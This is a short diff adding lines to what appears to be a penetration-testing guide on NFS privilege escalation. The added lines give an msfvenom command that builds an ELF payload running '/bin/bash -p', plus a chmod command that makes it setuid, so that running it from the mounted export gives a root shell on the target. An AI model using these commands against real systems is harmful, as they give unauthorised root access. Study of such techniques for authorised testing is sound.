@@ -1120,6 +1120,16 @@ sudo chown root:root /mnt/nfs/nfs-root
 sudo chmod 4755 /mnt/nfs/nfs-root
 ```
 
+or
+
+```
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+```
+
+```
+chmod +xs /tmp/nfs/shell.elf
+```
+
 Execute it from the target through the mounted export path.
 
 ### Caveats
